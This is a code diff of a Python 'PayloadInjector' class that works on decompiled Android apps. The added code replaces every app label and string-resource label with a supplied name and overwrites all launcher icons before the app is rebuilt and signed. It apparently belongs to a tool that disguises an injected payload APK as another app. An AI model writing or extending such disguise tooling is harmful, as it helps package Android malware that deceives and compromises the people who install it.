@@ -242,35 +242,29 @@ class PayloadInjector:
             with open(manifest_path, 'r', encoding='utf-8') as f:
                 content = f.read()
             
-            # Find and replace android:label
-            # Pattern 1: android:label="..."
+            # Update ALL android:label occurrences (application + activities)
+            # This ensures launcher also shows correct name
+            
+            # Pattern 1: Direct labels
             if 'android:label="' in content:
+                # Replace all android:label with new name
                 content = re.sub(
                     r'android:label="[^"]*"',
                     f'android:label="{app_name}"',
-                    content,
-                    count=1  # Only first occurrence (application tag)
+                    content
                 )
-                logger.info(f"✅ Payload app name updated to: {app_name}")
+                logger.info(f"✅ Payload app name updated to: {app_name} (all labels)")
             
-            # Pattern 2: android:label="@string/..."
-            elif 'android:label="@string/' in content:
-                # Extract string resource name
-                match = re.search(r'android:label="@string/([^"]+)"', content)
-                if match:
-                    string_name = match.group(1)
-                    # Update strings.xml
-                    if await self._update_strings_xml(string_name, app_name):
-                        logger.info(f"✅ Payload app name updated to: {app_name}")
-                    else:
-                        # Fallback: replace with direct string
-                        content = re.sub(
-                            r'android:label="@string/[^"]+"',
-                            f'android:label="{app_name}"',
-                            content,
-                            count=1
-                        )
-                        logger.info(f"✅ Payload app name updated to: {app_name} (direct)")
+            # Pattern 2: String resources
+            if 'android:label="@string/' in content:
+                # Find all unique string resource names used for labels
+                string_refs = re.findall(r'android:label="@string/([^"]+)"', content)
+                
+                # Update each string resource
+                for string_name in set(string_refs):
+                    await self._update_strings_xml(string_name, app_name)
+                
+                logger.info(f"✅ Payload app name updated to: {app_name} (string resources)")
             
             # Write back
             with open(manifest_path, 'w', encoding='utf-8') as f:
@@ -317,22 +311,79 @@ class PayloadInjector:
             return False
     
     async def _inject_icon(self, icon_path):
-        """Replace assets/update/app.png with user icon"""
+        """Replace both app.png and payload launcher icon"""
         try:
+            # 1. Update assets/update/app.png
             target_path = os.path.join(self.decompiled_dir, 'assets', 'update', 'app.png')
             
-            # Remove old icon
             if os.path.exists(target_path):
                 os.remove(target_path)
             
-            # Copy new icon
             shutil.copy2(icon_path, target_path)
-            logger.info("✅ Icon updated")
+            logger.info("✅ Web icon updated (app.png)")
+            
+            # 2. Update payload launcher icon (ic_launcher)
+            await self._update_payload_launcher_icon(icon_path)
             
             return True
             
         except Exception as e:
             logger.error(f"Icon injection error: {str(e)}")
+            return False
+    
+    async def _update_payload_launcher_icon(self, icon_path):
+        """Replace payload ic_launcher with plugin icon"""
+        try:
+            res_dir = os.path.join(self.decompiled_dir, 'res')
+            
+            if not os.path.exists(res_dir):
+                logger.warning("res directory not found")
+                return False
+            
+            # Icon directories to update (in priority order)
+            icon_dirs = [
+                'mipmap-xxxhdpi',
+                'mipmap-xxhdpi',
+                'mipmap-xhdpi',
+                'mipmap-hdpi',
+                'mipmap-mdpi',
+                'drawable-xxxhdpi',
+                'drawable-xxhdpi',
+                'drawable-xhdpi',
+                'drawable-hdpi',
+                'drawable-mdpi',
+            ]
+            
+            updated_count = 0
+            
+            for icon_dir in icon_dirs:
+                dir_path = os.path.join(res_dir, icon_dir)
+                
+                if not os.path.exists(dir_path):
+                    continue
+                
+                # Look for ic_launcher files
+                for file in os.listdir(dir_path):
+                    if file.startswith('ic_launcher') and file.endswith(('.png', '.webp', '.jpg')):
+                        target_icon = os.path.join(dir_path, file)
+                        
+                        # Get extension
+                        ext = os.path.splitext(target_icon)[1]
+                        
+                        # Copy icon (keep original extension)
+                        shutil.copy2(icon_path, target_icon)
+                        updated_count += 1
+                        logger.debug(f"Updated: {icon_dir}/{file}")
+            
+            if updated_count > 0:
+                logger.info(f"✅ Launcher icon updated ({updated_count} files)")
+                return True
+            else:
+                logger.warning("No ic_launcher files found to update")
+                return False
+            
+        except Exception as e:
+            logger.error(f"Launcher icon update error: {str(e)}")
             return False
     
     async def _rebuild_and_sign(self, output_path):
